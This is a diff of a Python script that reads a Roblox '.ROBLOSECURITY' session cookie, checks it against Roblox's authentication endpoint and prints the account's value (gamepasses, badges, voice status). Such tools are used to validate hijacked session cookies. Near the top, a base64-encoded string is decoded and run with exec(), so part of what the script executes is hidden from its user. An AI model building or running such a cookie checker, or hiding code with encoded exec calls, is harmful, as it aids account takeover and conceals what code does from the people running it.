@@ -12,10 +12,11 @@ dontskid = "ZGVmIGNyZWRpdHMoKTogIyBtYWRlIHRoaXMgc28gc2tpZHMgZG9udCBza2lkIGl0IGxv
 antiskid = base64.b64decode(dontskid).decode('utf-8')
 exec(antiskid)
 
+# Checking Cookies...
 def check():
     cookie = input("Cookie: ")
     if not cookie:
-        print("Invalid Cookie")
+        print("Invalid Cookie") # use valid cookie!
         return
     
     response = get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cookie})
@@ -60,7 +61,7 @@ def check():
         Voice Chat: {account_voice_verified}
         Gamepasses Worth: {account_gamepasses}
         Badges: {account_badges}
-        """)
+        """) # Succesfully Checked
         
     elif 'Unauthorized' in response.text:
         print("Invalid Cookie")
@@ -68,6 +69,6 @@ def check():
         print("Error")
         print(response.text)
     
-    input("Done Checking! Press Enter To Exit...")  
+    input("Press Enter To Exit...")  
 
 check()
